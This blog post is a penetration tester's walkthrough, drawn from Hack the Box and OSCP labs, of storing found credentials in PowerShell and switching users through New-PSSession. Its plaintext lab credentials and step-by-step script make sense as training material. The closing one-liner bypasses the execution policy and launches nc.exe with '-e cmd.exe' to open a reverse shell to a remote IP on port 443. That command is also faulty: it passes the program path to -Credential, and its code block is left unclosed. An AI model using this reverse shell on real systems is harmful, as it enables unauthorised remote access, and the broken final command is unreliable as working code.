---
layout: post
title:  "Powershell For Penetration Testers Switching Users"
author: nanobyte
date:   2020-06-01
description: PowerShell for Penetration Testing, and how to use credentials to switch users
tags: PowerShell
---

While completing Hack the Box's Sniper machine, I came across the need to have to switch to a different user. Credentials were discovered in a db.php file, and there was no way to login as that user using external tools such as Evil-WinRM. However, thanks to PowerShell, there is a simple way to quickly write a script to store these credentials in variables, and enter a new PowerShell session to that user. To begin, the credentials discovered were Chris:36mEAhz/B8xQ~2VM. To start out, the first variables I needed to set were the username and password:

{% highlight bash linenos %}
$username='Chris'
$password='36mEAhz/B8xQ~2VM'
{% endhighlight %}

Now that I had the credentials stored, I could not pass these credentials as plain text. PowerShell is special when it comes to handling passwords; it requires that you use a secure string when passing passwords for accounts. This can be completed using PowerShells ConvertTo-SecureString. To find out more about this, please visit <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring?view=powershell-7" target="_blank">docs.Microsoft.com</a>. To secure the password, I made a new variable `$securePassword` and secured the `$password` string:

{% highlight bash linenos %}
$username='Chris'
$password='36mEAhz/B8xQ~2VM'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
{% endhighlight %}

Now, I had the beginning parts of my script complete. It has taken basic user credentials and stored them securely to pass for use to enter into our new session. The next stage is creating a `$credential` variable and using PowerShell's New-Object cmdlet to create a new .NET framework object for the credentials. In PowerShell, objects are "things" that the language can "consume", and have their own properties. In my case, I was creating a new `$credential` object for PowerShell to "use" that consist of several properties. We can see these properties coming up. To make this object, I added the following command to our script:

{% highlight bash linenos %}
$username='Chris'
$password='36mEAhz/B8xQ~2VM'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential ($username, $securePassword)
{% endhighlight %}

With that I had created our object containing Chris' credentials! At this point, I was able to check to make sure that the credentials are properly stored. PowerShell provides a GetNetworkCredentials method to verify this. I simply called this method on the new credentials object, along with format-list. PowerShell's format-list is a powerful output tool, which displays a tabled list of properties. To output all the properties, we include the star symbol after the cmdlet:

{% highlight bash linenos %}
$username='Chris'
$password='36mEAhz/B8xQ~2VM'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential ($username, $securePassword)
$credential.GetNetworkCredential() | Format-List *
{% endhighlight %}

And as output, we should see the proper credentials returned in a PowerShell formatted list:

{% highlight bash linenos %}
UserName       : Chris
Password       : 36mEAhz/B8xQ~2VM
SecurePassword : System.Security.SecureString
{% endhighlight %}

Finally, I then entered into a new PowerShell session. This is completed by first using the New-PSSession cmdlet. This cmdlet allows us to create a new session on a local or remote computer. I then passed the stored secure credentials to this new session! And once passed, I piped to PowerShell's Enter-PSSession cmdlet to enter into the session:

{% highlight bash linenos %}
$username='Chris'
$password='36mEAhz/B8xQ~2VM'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential ($username, $securePassword)
$credential.GetNetworkCredential() | Format-List *
New-PSSession -Credential $credential | Enter-PSSession
{% endhighlight %}

And with that, I had properly created a simple script to switch into a user PowerShell session, when I was unable to log into the machine using external tools! 

Now, to take this one step further. I could use this method and create a PowerShell one-liner. This one liner would look something like this (I have removed the `$credential.GetNetworkCredential() | Format-List *` line to make the line more digestable, but can be placed in for a credential check:

{% highlight bash linenos %}
$username='Chris';$password='36mEAhz/B8xQ~2VM';$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential ($username, $securePassword);New-PSSession -Credential $credential | Enter-PSSession
{% endhighlight %}

And this would enter into a new PowerShell session as a one-liner. To use this one-liner in another practical example, during OSCP's labs I had to bypass a restricted PowerShell policy and spawn a new process with user credentials, in a one-liner. To start, check out my previous post on <a href="https://ubg-hacking.team/2020/05/23/powershell-for-pentesters-beating-restricted-policies.html" target="_blank">beating PowerShell's restricted policies</a>. To spawn our new process, we would make the following change:

{% highlight bash linenos %}
powershell -exec bypass -nop -c "& {$username='Chris';$password='36mEAhz/B8xQ~2VM';$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential ($username, $securePassword);$prog='C:\\temp\\nc.exe'; $args='-e cmd.exe 192.168.119.129 443'; Start-Process -Credential $prog $args }"

It is important to pass the `-Credential` object first, before `$prog` and the `$args` variables to work properly. Thanks for reading!
